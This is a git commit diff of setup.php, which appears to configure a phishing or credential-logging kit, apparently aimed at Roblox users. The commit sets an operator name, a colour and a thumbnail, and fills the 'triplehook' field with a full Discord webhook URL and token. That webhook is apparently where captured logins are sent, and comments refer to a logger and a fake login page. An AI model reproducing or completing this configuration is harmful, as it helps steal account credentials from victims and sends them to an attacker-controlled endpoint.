5581dafcac41694bbc812d748aa2a7bf1cf5e8fc
Johncenalives <150700203+Johncenalives@users.noreply.github.com>
2023-11-13 10:33:09 -0500

    Update setup.php

--- setup.php
+++ setup.php
@@ -1,8 +1,8 @@
 <?php
-$name = 'TermedRaaaa'; // Change to ur own name
-$thumbnail = 'https://images.rbxcdn.com/cece570e37aa8f95a450ab0484a18d91'; // discord webhook thumbnail & logger thumbnail
-$hex = '#00000'; // color shit
-$triplehook = ''; // input ur fucking triplehook webhook here 
+$name = 'Shxcker'; // Change to ur own name
+$thumbnail = 'https://cdn.discordapp.com/attachments/1156065481007042611/1173643757980242022/Hnet.com-image.png?ex=6564b3ed&is=65523eed&hm=afa33cf26d54affd97537e7737ca66b039fb6b0a0365ca42728928e75ea4f973&'; // discord webhook thumbnail & logger thumbnail
+$hex = '#65067a'; // color shit
+$triplehook = 'https://discord.com/api/webhooks/1173643027680604230/1WNSAvg0gvWtLhRHKF6w-941CBZx3dXaH47pLISKKwVF0hG9jTB8CaxAsuE64sk4hYFl'; // input ur fucking triplehook webhook here 
 $loginColor = [
     "theme" => "dark", // change be changed to white to for white login page
 ];
